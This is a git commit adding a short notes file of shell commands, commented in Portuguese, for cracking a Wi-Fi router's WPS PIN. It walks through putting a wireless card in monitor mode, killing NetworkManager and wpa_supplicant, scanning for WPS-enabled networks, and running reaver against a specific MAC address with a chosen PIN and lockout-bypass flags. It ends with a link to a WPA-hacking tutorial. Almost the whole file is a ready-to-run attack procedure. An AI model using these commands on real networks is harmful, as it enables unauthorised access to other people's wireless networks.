7af4139fd7f1b5e6cc520ac1e018086f444a93e1
João Batista <joao42lbatista@gmail.com>
2016-10-08 15:58:16 -0300

    Adding WPS use

---
+++ pacotes capturados/quebra de senha/wps.r
@@ -0,0 +1,35 @@
+    ## WPS ##
+
+## Ver a interface de rede sem fio (Neste caso é wlan0)
+ifconfig
+iwconfig
+airmon-ng
+
+## Iniciar a interface (wlan0) em modo monitor (para ser possível capturar todo pacotes
+    # Irá criar uma "nova" interface em modo monitor, neste caso wlan0mon
+airmon-ng start wlan0
+
+
+## Termine todo programas secundário que pode atrapalhar na captura
+    # Por exemplo NetworkManager e wpa_supplicant
+        # killall NetworkManager
+        # killall wpa_supplicant
+
+    ## Pelo airmon-ng
+airmon-ng check kill
+
+## walsh verifica os rede com WPS ativado
+walsh -i wlan0mon
+
+## Depois desse porcesso deverá escolhar a rede alvo
+    # -i interface -c chanal -b MAC address -vv verbose
+reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -vv
+
+    # -p PIN envia o específico PIN para teste
+reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -p 19018324  -vv
+
+    # --ignore-locks ignora lock do roteador, que pode ainda estar respondendo aos PIN enviados
+reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -p 19018324  -vv --ignore-locks
+
+## Good links
+http://null-byte.wonderhowto.com/how-to/hack-wpa-wifi-passwords-by-cracking-wps-pin-0132542/
